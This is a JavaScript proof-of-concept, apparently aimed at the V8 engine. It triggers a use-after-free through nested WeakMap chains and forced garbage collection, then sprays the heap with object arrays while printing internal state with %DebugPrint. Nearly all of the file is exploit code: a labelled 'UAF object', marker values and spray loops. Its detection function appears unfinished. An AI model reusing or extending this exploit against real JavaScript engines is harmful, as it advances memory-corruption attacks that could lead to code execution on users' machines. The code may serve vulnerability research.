let wm = new WeakMap();
let k0 = { k: 0 };
var gb = true;
let arr_size = 1 << 15;

let MARKER_1 = 0xfe;
let MARKER_2 = 1.1337;

let SPRAY_FACTOR = 1000;
var GC_SIZE = 0x4fe00000;

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);
global = {};

function gc() {
    new ArrayBuffer(GC_SIZE);
}

function trigger() {
    let s2wm = new WeakMap();

    let v0 = { v: 0 };
    let k1 = { k: 1 };
    let k2 = { k: 2 };

    let v1 = s2wm;
    let v3 = [k1];

    let innerWm = new WeakMap();

    /* Stage 0 */
    wm.set(k1, v1);
    wm.set(v0, innerWm);
    wm.set(k0, v0);

    innerWm.set(k2, v3);
    innerWm.set(k0, k2);

    let s2innerWm = new WeakMap();
    let s2v0 = { v: 00 };
    let s2k1 = { k: 11 };

    /* Craft the UAF object */
    let s2v1__uaf = new Array(arr_size).fill(MARKER_2); // Double PTR

    let s2k2 = { k: 22 };
    let s2v3 = [s2k1];

    /* Stage 1 */
    s2wm.set(s2k1, s2v1__uaf);
    s2wm.set(s2v0, s2innerWm);
    s2wm.set(k0, s2v0);

    s2innerWm.set(s2k2, s2v3);
    s2innerWm.set(k0, s2k2);
}

function getUafObject(wm) {
    let innerWm = wm.get(wm.get(k0));
    let s2wm = wm.get( // v1
        innerWm.get( // v3
            innerWm.get(k0) // k2
        )[0]
    );

    let s2innerWm = s2wm.get(s2wm.get(k0));
    return s2wm.get( // s2v1
        s2innerWm.get( // s2v3
            s2innerWm.get(k0) // s2k2
        )[0]
    );
}

function find_uaf_indication(uaf_array) {
    uaf_array.filter(e => e != MARKER_1).forEach(e => { console.log('Amazing') });

    return -1;
}

let global_object = { a: 1, b: 2, c: 3 };

function main() {
    trigger();
    gc();

    let uaf_object = getUafObject(wm);
    %DebugPrint(uaf_object);

    // spray with PACKED_ELEMENTS objects
    let object_array = [];

    for (let i = 0; i < SPRAY_FACTOR; i++) {
        let new_obj = new Array(arr_size);
        object_array.push(new_obj);
    }

    for (let i = 0; i < object_array.length; i++) {
        let current_array = object_array[i];
        current_array.fill(global_object);
		%DebugPrint(object_array[i]);
    }
}
main();
